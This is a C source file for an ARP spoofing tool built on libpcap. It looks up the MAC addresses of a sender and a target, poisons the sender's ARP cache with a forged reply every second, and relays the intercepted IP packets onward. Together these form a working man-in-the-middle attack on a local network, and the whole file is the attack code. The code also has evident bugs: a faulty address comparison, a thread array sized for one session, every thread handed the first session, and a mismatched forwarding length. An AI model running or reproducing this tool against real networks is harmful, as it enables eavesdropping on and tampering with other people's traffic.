#include <unistd.h>
#include <stdio.h>
#include <pcap.h>
#include <arpa/inet.h>
#include <stdlib.h>
#include <netinet/in.h>
#include <sys/ioctl.h>
#include <string.h>
#include <net/if.h>
#include <net/ethernet.h>
#include <netinet/if_ether.h>
#include <netinet/ip.h>
#include <pthread.h>
#include <sys/socket.h>
#include <netdb.h>

struct addr{
	uint8_t mac[6];
	uint8_t ip[4];
};

struct netinfo{
	struct addr sender;
	struct addr target;
};

const char* interface;

struct netinfo* infolist;
struct addr myaddr;

void printMAC(uint8_t* mac){
	for(int i=0;i<5;i++)printf("%02x:",mac[i]);
	printf("%02x\n",mac[5]);
}

void getmacaddr(struct addr *addr,const char* inf){
	int s;
	struct ifreq ifr;
	s=socket(AF_INET,SOCK_RAW,IPPROTO_RAW);

	memset(&ifr,0,sizeof(ifr));
	snprintf(ifr.ifr_name,sizeof(ifr.ifr_name),"%s",inf);

	ioctl(s,SIOCGIFHWADDR,&ifr);
	close(s);

	memcpy(addr->mac,ifr.ifr_hwaddr.sa_data,6);
}

void getipaddr(struct addr *addr,const char* inf){
	int s;
	struct ifreq ifr;
	s=socket(AF_INET,SOCK_RAW,IPPROTO_RAW);

	memset(&ifr,0,sizeof(ifr));
	ifr.ifr_addr.sa_family=AF_INET;
	snprintf(ifr.ifr_name,sizeof(ifr.ifr_name),"%s",inf);

	ioctl(s,SIOCGIFADDR,&ifr);
	close(s);
	
	memcpy(addr->ip,&(((struct sockaddr_in*)&ifr.ifr_addr)->sin_addr),4);
}

void construct_eth(struct ether_header *eth,uint8_t* dst_mac,uint8_t* src_mac){
	memcpy(eth->ether_dhost,dst_mac,6);
	memcpy(eth->ether_shost,src_mac,6);
	eth->ether_type=ntohs(ETHERTYPE_ARP);
}

void construct_arp(struct ether_arp *arp,uint8_t* dst_mac,uint8_t* src_mac,int opcode){
	arp->arp_hrd=htons(ARPHRD_ETHER);
	arp->arp_pro=htons(ETHERTYPE_IP);
	arp->arp_hln=ETHER_ADDR_LEN;
	arp->arp_pln=sizeof(in_addr_t);
	if(opcode)arp->arp_op=htons(ARPOP_REQUEST);
	else arp->arp_op=htons(ARPOP_REPLY);
	if(dst_mac!=NULL)memcpy(arp->arp_tha,dst_mac,6);
	else memset(arp->arp_tha,'\x00',6);
	memcpy(arp->arp_sha,src_mac,6);
}

void combine(uint8_t* frame,struct ether_header *eth,struct ether_arp *arp){
	memset(frame,0x00,sizeof(struct ether_header)+sizeof(struct ether_arp));
	memcpy(frame,eth,sizeof(struct ether_header));
	memcpy(frame+sizeof(struct ether_header),arp,sizeof(struct ether_arp));
}

void get_othermac(struct addr* target,struct addr* sender){
	const uint8_t* packet;
	int res;
	struct pcap_pkthdr* header;
	struct ether_header eth;
	struct ether_arp arp;
	uint8_t* frame=(uint8_t*)malloc(sizeof(struct ether_header)+sizeof(struct ether_arp));
	pcap_t* handle;
	char errbuf[PCAP_ERRBUF_SIZE];

	handle=pcap_open_live(interface,BUFSIZ,1,1000,errbuf);

	construct_eth(&eth,"\xff\xff\xff\xff\xff\xff",sender->mac);
	construct_arp(&arp,NULL,sender->mac,1);
	memcpy((&arp)->arp_tpa,target->ip,4);
	memcpy((&arp)->arp_spa,sender->ip,4);
	combine(frame,&eth,&arp);
	
	if(pcap_sendpacket(handle,frame,sizeof(struct ether_header)+sizeof(struct ether_arp))==-1){
		pcap_perror(handle,0);
		pcap_close(handle);
		exit(1);
	}
	while(1){
		res=pcap_next_ex(handle,&header,&packet);
		struct ether_header *etherneth;
		etherneth=(struct ether_header*)packet;
	
		if(ntohs(etherneth->ether_type)==ETHERTYPE_ARP){
			struct ether_arp *arph;
			arph=(struct ether_arp*)(packet+sizeof(struct ether_header));
			
			for(int i=0;i<4;i++){
				if(arph->arp_spa[i]!=target->ip[i]){
				printf("unsame ip\n");
				continue;
				}
			}

			printf("same ip\n");
			memcpy(target->mac,&packet[6],6);
                        printMAC(target->mac);
                        break;
		}
		if(res==0)continue;
		if(res==-1||res==-2)break;
	}
}

void* arp_infect(void* data){
	struct netinfo* info=(struct netinfo*)malloc(sizeof(struct netinfo));
	info=(struct netinfo*)data;
	struct ether_header fake_eth;
	struct ether_arp fake_arp;
	uint8_t* fake_frame=(uint8_t*)malloc(sizeof(struct ether_header)+sizeof(struct ether_arp));
	pcap_t* handle;	
	char errbuf[PCAP_ERRBUF_SIZE];

	handle=pcap_open_live(interface,BUFSIZ,1,1000,errbuf);

	construct_eth(&fake_eth,info->sender.mac,myaddr.mac);
	construct_arp(&fake_arp,info->sender.mac,myaddr.mac,0);
	memcpy((&fake_arp)->arp_tpa,info->sender.ip,4);
	memcpy((&fake_arp)->arp_spa,info->target.ip,4);
	combine(fake_frame,&fake_eth,&fake_arp);

	printf("arp infect start\n");
	while(1){
		if(pcap_sendpacket(handle,fake_frame,sizeof(struct ether_header)+sizeof(struct ether_arp))==-1){
		pcap_perror(handle,0);
		pcap_close(handle);
		}
		sleep(1);
	}
	free(info);
	free(fake_frame);
}

void* ip_forward(void* data){
	struct netinfo* info=(struct netinfo*)malloc(sizeof(struct netinfo));
	info=(struct netinfo*)data;
	const uint8_t* packet;
	int res;
	struct pcap_pkthdr* header;
	struct ether_header* eth;
	struct ip* iph;
	uint8_t* address=(uint8_t*)malloc(30);
	uint8_t cmpip[30];
	uint8_t* fake_packet=(uint8_t*)malloc(100);
	pcap_t* handle;
	char errbuf[PCAP_ERRBUF_SIZE];
	
	handle=pcap_open_live(interface,BUFSIZ,1,1000,errbuf);
		
	while(1){
		res=pcap_next_ex(handle,&header,&packet);
		
		eth=(struct ether_header*)packet;
		if(memcmp(eth->ether_dhost,myaddr.mac,6))continue;
		//check whether packet's source mac is sender's mac
		if(memcmp(eth->ether_shost,info->sender.mac,6))continue;
		//check whether packet is ip protocol
		if(ntohs(eth->ether_type)!=ETHERTYPE_IP)continue;

		printf("this packet is ip protocol\n");
		iph=(struct ip*)(packet+sizeof(struct ether_header));
		//check whether packet's target ip is target's ip
		address=inet_ntoa(iph->ip_dst);
		sprintf(cmpip,"%d.%d.%d.%d",info->target.ip[0],info->target.ip[1],info->target.ip[2],info->target.ip[3]);
		if(strcmp(address,cmpip))continue;
		printf("we must forward it\n");

		//forwarding
		memcpy(fake_packet,packet,100);
		memcpy(&fake_packet[6],myaddr.mac,6);
		memcpy(&fake_packet[0],info->target.mac,6);
		if(pcap_sendpacket(handle,fake_packet,sizeof(struct ether_header)+sizeof(struct ether_arp))==-1){
                pcap_perror(handle,0);
                pcap_close(handle);
                exit(1);
        }
		printf("forwarding complete\n");
	}
	free(address);
	free(info);
	free(fake_packet);
}

void* arp_spoof(void* data){
	struct netinfo* info=(struct netinfo*)malloc(sizeof(struct netinfo));
	info=(struct netinfo*)data;
	pthread_t thread[2];
	int status;
	int thread_id;
	
	//infect sender's arp table periodly
	thread_id=pthread_create(&thread[0],NULL,arp_infect,(void*)info);
	if(thread_id){
		fprintf(stderr,"pthread_create error\n");
		exit(1);
	}

	//ip packet forwarding
	thread_id=pthread_create(&thread[1],NULL,ip_forward,(void*)info);
        if(thread_id){
                fprintf(stderr,"pthread_create error\n");
                exit(1);
        }

	pthread_join(thread[0],(void**)&status);
	pthread_join(thread[1],(void**)&status);
	free(info);
}

int main(int argc,char** argv){
	char att[30];
	int session=argc/2-1;
	pthread_t* thread;
	int status;
	int thread_id;
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle;
	interface=argv[1];
	
	handle=pcap_open_live(interface,BUFSIZ,0,1000,errbuf);

	printf("my mac : ");
	getmacaddr(&myaddr,interface);
	printMAC(myaddr.mac);

	printf("attacker ip : ");
	getipaddr(&myaddr,interface);
	sprintf(att,"%d.%d.%d.%d",myaddr.ip[0],myaddr.ip[1],myaddr.ip[2],myaddr.ip[3]);
	printf("%s\n",att);
	
	infolist = (struct netinfo*)malloc(session*sizeof(struct netinfo));
	for(int i=0;i<session;i++){
		inet_pton(AF_INET,argv[i*2+2],infolist[i].sender.ip);
		inet_pton(AF_INET,argv[i*2+3],infolist[i].target.ip);
		get_othermac(&(infolist[i].sender),&myaddr);
		get_othermac(&(infolist[i].target),&myaddr);
	}
	thread = (pthread_t*)malloc(sizeof(pthread_t));
	for(int i=0;i<session;i++){
		thread_id=pthread_create(&thread[i],NULL,arp_spoof,(void*)&infolist[0]);
		if(thread_id){
			fprintf(stderr,"pthread_create error\n");
			exit(1);
		}
		sleep(3);
	}
	for(int i=0;i<session;i++){
		pthread_join(thread[i],(void**)&status);
	}
	pcap_close(handle);
	return 0;
}
